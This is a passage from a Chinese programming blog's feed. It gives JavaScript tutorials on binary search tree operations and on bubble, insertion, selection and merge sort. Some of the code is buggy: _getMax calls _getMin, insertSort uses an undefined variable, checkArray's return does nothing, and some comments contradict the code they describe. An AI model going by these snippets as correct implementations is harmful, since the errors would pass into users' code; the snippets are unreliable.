class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">getMin() &#123;</div><div class="line">  return this._getMin(this.root).value</div><div class="line">&#125;</div><div class="line">_getMin(<span class="keyword">node</span><span class="title">) &#123;</span></div><div class="line">  if (!<span class="keyword">node</span>.<span class="title">left</span>) return <span class="keyword">node</span></div><div class="line">  <span class="title">return</span> this._getMin(<span class="keyword">node</span>.<span class="title">left</span>)</div><div class="line">&#125;</div><div class="line">getMax() &#123;</div><div class="line">  return this._getMax(this.root).value</div><div class="line">&#125;</div><div class="line">_getMax(<span class="keyword">node</span><span class="title">) &#123;</span></div><div class="line">  if (!<span class="keyword">node</span>.<span class="title">right</span>) return <span class="keyword">node</span></div><div class="line">  <span class="title">return</span> this._getMin(<span class="keyword">node</span>.<span class="title">right</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>第二步：向上取整和向下取整，这两个操作是相反的，所以代码也是类似的，这里只介绍如何向下取整。</p><p>既然是向下取整，那么根据二分查找树的特性，值一定在根节点的左侧。只需要一直遍历左子树直到当前节点的值不再大于等于需要的值，然后判断节点是否还拥有右子树。如果有的话，继续上面的递归判断。<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">floor(v) &#123;</div><div class="line">  let <span class="keyword">node</span> <span class="title">= this</span>._floor(this.root, v)</div><div class="line">  return <span class="keyword">node</span> <span class="title">? node</span>.value : null</div><div class="line">&#125;</div><div class="line">_floor(<span class="keyword">node</span><span class="title">, v</span>) &#123;</div><div class="line">  if (!<span class="keyword">node</span><span class="title">) return</span> null</div><div class="line">  if (<span class="keyword">node</span>.<span class="title">value</span> === v) return v</div><div class="line">  // 如果当前节点值还比需要的值大，就继续递归</div><div class="line">  if (<span class="keyword">node</span>.<span class="title">value</span> &gt; v) &#123;</div><div class="line">    return this._floor(<span class="keyword">node</span>.<span class="title">left</span>, v)</div><div class="line">  &#125;</div><div class="line">  // 判断当前节点是否拥有右子树</div><div class="line">  let right = this._floor(<span class="keyword">node</span>.<span class="title">right</span>, v)</div><div class="line">  if (right) return right</div><div class="line">  return <span class="keyword">node</span></div><div class="line"><span class="title">&#125;</span></div></pre></td></tr></table></figure></p><p>第三步：<strong>排 名</strong><br>这是用于获取给定值的排名或者排名第几的节点的值，这两个操作也是相反的，所以这个只介绍如何获取排名第几的节点的值。对于这个操作而言，我们需要略微的改造点代码，让每个节点拥有一个 <code>size</code> 属性。该属性表示该节点下有多少子节点（包含自身）<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>(value) &#123;</div><div class="line">    <span class="keyword">this</span>.value = value</div><div class="line">    <span class="keyword">this</span>.left = <span class="literal">null</span></div><div class="line">    <span class="keyword">this</span>.right = <span class="literal">null</span></div><div class="line">    <span class="comment">// 修改代码</span></div><div class="line">    <span class="keyword">this</span>.size = <span class="number">1</span></div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">// 新增代码</span></div><div class="line">_getSize(node) &#123;</div><div class="line">  <span class="keyword">return</span> node ? node.size : <span class="number">0</span></div><div class="line">&#125;</div><div class="line">_addChild(node, v) &#123;</div><div class="line">  <span class="keyword">if</span> (!node) &#123;</div><div class="line">    <span class="keyword">return</span> new Node(v)</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> (node.value &gt; v) &#123;</div><div class="line">    <span class="comment">// 修改代码</span></div><div class="line">    node.size++</div><div class="line">    node.left = <span class="keyword">this</span>._addChild(node.left, v)</div><div class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (node.value &lt; v) &#123;</div><div class="line">    <span class="comment">// 修改代码</span></div><div class="line">    node.size++</div><div class="line">    node.right = <span class="keyword">this</span>._addChild(node.right, v)</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> node</div><div class="line">&#125;</div><div class="line">select(k) &#123;</div><div class="line">  let node = <span class="keyword">this</span>._select(<span class="keyword">this</span>.root, k)</div><div class="line">  <span class="keyword">return</span> node ? node.value : <span class="literal">null</span></div><div class="line">&#125;</div><div class="line">_select(node, k) &#123;</div><div class="line">  <span class="keyword">if</span> (!node) <span class="keyword">return</span> <span class="literal">null</span></div><div class="line">  <span class="comment">// 先获取左子树下有几个节点</span></div><div class="line">  let size = node.left ? node.left.size : <span class="number">0</span></div><div class="line">  <span class="comment">// 判断 size 是否大于 k</span></div><div class="line">  <span class="comment">// 如果大于 k，代表所需要的节点在左节点</span></div><div class="line">  <span class="keyword">if</span> (size &gt; k) <span class="keyword">return</span> <span class="keyword">this</span>._select(node.left, k)</div><div class="line">  <span class="comment">// 如果小于 k，代表所需要的节点在右节点</span></div><div class="line">  <span class="comment">// 注意这里需要重新计算 k，减去根节点除了右子树的节点数量</span></div><div class="line">  <span class="keyword">if</span> (size &lt; k) <span class="keyword">return</span> <span class="keyword">this</span>._select(node.right, k - size - <span class="number">1</span>)</div><div class="line">  <span class="keyword">return</span> node</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><blockquote><p>四、删除(最小)节点</p></blockquote><p>对于删除节点来说，会存在以下几种情况</p><ul><li>需要删除的节点没有子树</li><li>需要删除的节点只有一条子树</li><li>需要删除的节点有左右两条树</li></ul><p>对于前两种情况很好解决，但是第三种情况就有难度了，所以先来实现相对简单的操作：<strong>删除最小节点</strong>，对于删除最小节点来说，是不存在第三种情况的，删除最大节点操作是和删除最小节点相反的，所以这里也就不再赘述。<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">delectMin() &#123;</div><div class="line">  this.root = this._delectMin(this.root)</div><div class="line">  console.log(this.root)</div><div class="line">&#125;</div><div class="line">_delectMin(<span class="keyword">node</span><span class="title">) &#123;</span></div><div class="line">  // 一直递归左子树</div><div class="line">  // 如果左子树为空，就判断节点是否拥有右子树</div><div class="line">  // 有右子树的话就把需要删除的节点替换为右子树</div><div class="line">  if ((<span class="keyword">node</span> <span class="title">!= null</span>) &amp; !<span class="keyword">node</span>.<span class="title">left</span>) return <span class="keyword">node</span>.<span class="title">right</span></div><div class="line">  <span class="keyword">node</span>.<span class="title">left</span> = this._delectMin(<span class="keyword">node</span>.<span class="title">left</span>)</div><div class="line">  // 最后需要重新维护下节点的 `size`</div><div class="line">  <span class="keyword">node</span>.<span class="title">size</span> = this._getSize(<span class="keyword">node</span>.<span class="title">left</span>) + this._getSize(<span class="keyword">node</span>.<span class="title">right</span>) + <span class="number">1</span></div><div class="line">  return <span class="keyword">node</span></div><div class="line"><span class="title">&#125;</span></div></pre></td></tr></table></figure></p><blockquote><p>五、删除(任意)节点</p></blockquote><p>当遇到这种情况时，需要取出当前节点的后继节点（也就是当前节点右子树的最小节点）来替换需要删除的节点。然后将需要删除节点的左子树赋值给后继结点，右子树删除后继结点后赋值给他。</p><p>你如果对于这个解决办法有疑问的话，可以这样考虑。因为二分查找树的特性，父节点一定比所有左子节点大，比所有右子节点小。那么当需要删除父节点时，势必需要拿出一个比父节点大的节点来替换父节点。这个节点肯定不存在于左子树，必然存在于右子树。然后又需要保持父节点都是比右子节点小的，那么就可以取出右子树中最小的那个节点来替换父节点。<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">delect(v) &#123;</div><div class="line">  this.root = this._delect(this.root, v)</div><div class="line">&#125;</div><div class="line">_delect(<span class="keyword">node</span><span class="title">, v</span>) &#123;</div><div class="line">  if (!<span class="keyword">node</span><span class="title">) return</span> null</div><div class="line">  // 寻找的节点比当前节点小，去左子树找</div><div class="line">  if (<span class="keyword">node</span>.<span class="title">value</span> <span class="tag">&lt; v) &#123;</span></div><div class="line">    node.right = this._delect(node.right, v)</div><div class="line">  &#125; else if (node.value &gt; v) &#123;</div><div class="line">    // 寻找的节点比当前节点大，去右子树找</div><div class="line">    <span class="keyword">node</span>.<span class="title">left</span> = this._delect(<span class="keyword">node</span>.<span class="title">left</span>, v)</div><div class="line">  &#125; else &#123;</div><div class="line">    // 进入这个条件说明已经找到节点</div><div class="line">    // 先判断节点是否拥有拥有左右子树中的一个</div><div class="line">    // 是的话，将子树返回出去，这里和 `_delectMin` 的操作一样</div><div class="line">    if (!<span class="keyword">node</span>.<span class="title">left</span>) return <span class="keyword">node</span>.<span class="title">right</span></div><div class="line">    if (!<span class="keyword">node</span>.<span class="title">right</span>) return <span class="keyword">node</span>.<span class="title">left</span></div><div class="line">    // 进入这里，代表节点拥有左右子树</div><div class="line">    // 先取出当前节点的后继结点，也就是取当前节点右子树的最小值</div><div class="line">    let min = this._getMin(<span class="keyword">node</span>.<span class="title">right</span>)</div><div class="line">    // 取出最小值后，删除最小值</div><div class="line">    // 然后把删除节点后的子树赋值给最小值节点</div><div class="line">    min.right = this._delectMin(<span class="keyword">node</span>.<span class="title">right</span>)</div><div class="line">    // 左子树不动</div><div class="line">    min.left = <span class="keyword">node</span>.<span class="title">left</span></div><div class="line">    <span class="keyword">node</span> <span class="title">= min</span></div><div class="line">  &#125;</div><div class="line">  // 维护 size</div><div class="line">  <span class="keyword">node</span>.<span class="title">size</span> = this._getSize(<span class="keyword">node</span>.<span class="title">left</span>) + this._getSize(<span class="keyword">node</span>.<span class="title">right</span>) + <span class="number">1</span></div><div class="line">  return <span class="keyword">node</span></div><div class="line"><span class="title">&#125;</span></div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;树拥有很多种结构，二叉树是树中最常用的结构，同时也是一个天然的递归结构。&lt;/p&gt;
&lt;p&gt;二分查找树也是二叉树，拥有二叉树的特性。但是区别在于二分查找树每个节点的值都&lt;strong&gt;比他的左子树的值大&lt;/strong&gt;，&lt;strong&gt;比右子树的值小&lt;/strong&gt;。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一、创建一颗最简单的树&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight kotlin&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Node&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;constructor&lt;/span&gt;(value) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.value = value&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.left = &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.right = &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;BST&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;constructor&lt;/span&gt;() &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.root = &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.size = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  getSize() &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.size&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  isEmpty() &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.size === &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  addNode(v) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.root = &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._addChild(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.root, v)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 添加节点时，需要比较添加的节点值和当前&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 节点值的大小&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  _addChild(node, v) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!node) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.size++&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; new Node(v)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (node.value &amp;gt; v) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      node.left = &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._addChild(node.left, v)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (node.value &amp;lt; v) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      node.right = &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._addChild(node.right, v)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; node&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>排序算法</title>
    <link href="wangsiyuan233.github.io/2018/07/19/62%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"/>
    <id>wangsiyuan233.github.io/2018/07/19/62排序算法/</id>
    <published>2018-07-19T03:27:06.000Z</published>
    <updated>2018-07-25T23:25:48.691Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p> 准备</p></blockquote><p>1、时间复杂度：</p><p>通常使用最差的时间复杂度来衡量一个算法的好坏。</p><p>常数时间 O(1) 代表这个操作和数据量没关系，是一个固定时间的操作，比如说四则运算。</p><p>对于一个算法来说，可能会计算出如下操作次数 <code>aN + 1</code>，<code>N</code> 代表数据量。那么该算法的时间复杂度就是 <code>O(N)</code>。因为我们在计算时间复杂度的时候，数据量通常是非常大的，这时候低阶项和常数项可以忽略不计。</p><p>当然可能会出现两个算法都是 <code>O(N)</code> 的时间复杂度，那么对比两个算法的好坏就要通过对比低阶项和常数项了。</p><p>2、以下两个函数是本章节经常会用到的：<br><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">function</span> checkArray(<span class="built_in">array</span>)&#123;</div><div class="line">  <span class="keyword">if</span> (!<span class="built_in">array</span> || <span class="built_in">array</span>.length &lt;= <span class="number">2</span>) return</div><div class="line">&#125;</div><div class="line"><span class="keyword">function</span> swap(<span class="built_in">array</span>, <span class="built_in">left</span>, <span class="built_in">right</span>) &#123;</div><div class="line">  <span class="keyword">let</span> rightValue = <span class="built_in">array</span>[<span class="built_in">right</span>]</div><div class="line">  <span class="built_in">array</span>[<span class="built_in">right</span>] = <span class="built_in">array</span>[<span class="built_in">left</span>]</div><div class="line">  <span class="built_in">array</span>[<span class="built_in">left</span>] = rightValue</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><a id="more"></a><blockquote><p>一、冒泡排序</p></blockquote><p>冒泡排序是最简单的排序了，效率低下，从第一个开始，通过不断的和下一个数相比较，最后使得最小的数字在前面，最大的数字在后面。只用比较到 <code>length - 1</code></p><p>代码实现：<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">bubbleSort</span><span class="params">(array)</span></span>&#123;</div><div class="line">  checkArray(<span class="keyword">array</span>);</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i =  <span class="keyword">array</span>.length - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</div><div class="line">    <span class="comment">// 从 倒数第二个数 遍历到 0</span></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; i; j++)&#123;</div><div class="line">      <span class="comment">// 从 0 开始遍历到 i 的左边</span></div><div class="line">      <span class="keyword">if</span> (<span class="keyword">array</span>[j] &gt; <span class="keyword">array</span>[j+<span class="number">1</span>])&#123;</div><div class="line">        swap(<span class="keyword">array</span>, j, j+<span class="number">1</span>)</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"><span class="keyword">return</span> <span class="keyword">array</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/TplSwHr.gif" alt=""><br>该算法的操作次数是一个等差数列 <code>n + (n - 1) + (n - 2) + 1</code> ，去掉常数项以后得出时间复杂度是<code>O(n * n)</code></p><blockquote><p>二、插入排序</p></blockquote><p>原理：默认第一个数是已经排好了的，取出第二个数和第一个数比较，大的往后，小的在前；第三个数和此时第二个数+第一个数（之前所有的数）比较，以此类推。<br>代码实现：<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">insertSort</span><span class="params">(arry)</span></span>&#123;</div><div class="line">  checkArray(<span class="keyword">array</span>);</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; <span class="keyword">array</span>.length; i++) &#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = i - <span class="number">1</span>; j &gt;= <span class="number">0</span> &amp;&amp; <span class="keyword">array</span>[j] &gt; <span class="keyword">array</span>[j+<span class="number">1</span>]; j--) &#123;</div><div class="line">      swap(<span class="keyword">array</span>, j, j+<span class="number">1</span>)</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">array</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/CxZXZea.gif" alt=""><br>该算法的操作次数是一个等差数列 <code>n + (n - 1) + (n - 2) + 1</code> ，去掉常数项以后得出时间复杂度是 <code>O(n * n)</code></p><blockquote><p>三、选择排序</p></blockquote><p>原理：假定第一个数是最小值，遍历剩余数组，找出比它小的(最小的)数值；找得到就是新数字是最小值，找不到还是假定值是最小值；确定了真正的最小值了，就可以从第二个数字开始遍历<br>代码实现：<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">selectSort</span><span class="params">(array)</span></span>&#123;</div><div class="line">  checkArray(<span class="keyword">array</span>);</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="keyword">array</span>.length - <span class="number">1</span>; i++)&#123;</div><div class="line">    <span class="comment">// 从 0 到 倒数第二个</span></div><div class="line">    <span class="keyword">let</span> minIndex = i;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = i + <span class="number">1</span>; j &lt; <span class="keyword">array</span>.length; j++)&#123;</div><div class="line">      <span class="comment">// 从 第一个 到 最后一个</span></div><div class="line">      minIndex = <span class="keyword">array</span>[j] &lt; <span class="keyword">array</span>[minIndex] ? j : minIndex;</div><div class="line">      <span class="comment">// 最小的值 = 和 j 比较后 最小的那个值</span></div><div class="line">    &#125;</div><div class="line">    swap(<span class="keyword">array</span>, i, minIndex);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">array</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/R739A83.gif" alt=""><br>该算法的操作次数是一个等差数列 <code>n + (n - 1) + (n - 2) + 1</code> ，去掉常数项以后得出时间复杂度是 <code>O(n * n)</code></p><blockquote><p>四、归并排序</p></blockquote><p>原理：递归的将数组两两分开直到最多包含两个元素，然后将数组排序合并，最终合并为排序好的数组。假设我有一组数组 [3, 1, 2, 8, 9, 7, 6]，中间数索引是 3，先排序数组 [3, 1, 2, 8] 。在这个左边数组上，继续拆分直到变成数组包含两个元素（如果数组长度是奇数的话，会有一个拆分数组只包含一个元素）。然后排序数组 [3, 1] 和 [2, 8] ，然后再排序数组 [1, 3, 2, 8] ，这样左边数组就排序完成，然后按照以上思路排序右边数组，最后将数组 [1, 2, 3, 8] 和 [6, 7, 9] 排序。<br>代码实现：<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">sort</span><span class="params">(array)</span> </span>&#123;</div><div class="line">  checkArray(<span class="keyword">array</span>);</div><div class="line">  mergeSort(<span class="keyword">array</span>, <span class="number">0</span>, <span class="keyword">array</span>.length - <span class="number">1</span>);</div><div class="line">  <span class="keyword">return</span> <span class="keyword">array</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergeSort</span><span class="params">(array, left, right)</span> </span>&#123;</div><div class="line">  <span class="keyword">if</span> (left === right) <span class="keyword">return</span>;</div><div class="line">  <span class="comment">// 左右索引相同说明已经只有一个数</span></div><div class="line">  <span class="keyword">let</span> mid = parseInt(left + ((right - left) &gt;&gt; <span class="number">1</span>));</div><div class="line">  <span class="comment">// 等同于 `left + (right - left) / 2`</span></div><div class="line">  <span class="comment">// 相比 `(left + right) / 2` 来说更加安全，不会溢出</span></div><div class="line">  <span class="comment">// 使用位运算是因为位运算比四则运算快</span></div><div class="line">  mergeSort(<span class="keyword">array</span>, left, mid);</div><div class="line">  mergeSort(<span class="keyword">array</span>, mid + <span class="number">1</span>, right);</div><div class="line"></div><div class="line">  <span class="keyword">let</span> help = [];</div><div class="line">  <span class="keyword">let</span> i = <span class="number">0</span>;</div><div class="line">  <span class="keyword">let</span> p1 = left;</div><div class="line">  <span class="keyword">let</span> p2 = mid + <span class="number">1</span>;</div><div class="line">  <span class="keyword">while</span> (p1 &lt;= mid &amp;&amp; p2 &lt;= right) &#123;</div><div class="line">    help[i++] = <span class="keyword">array</span>[p1] &lt; <span 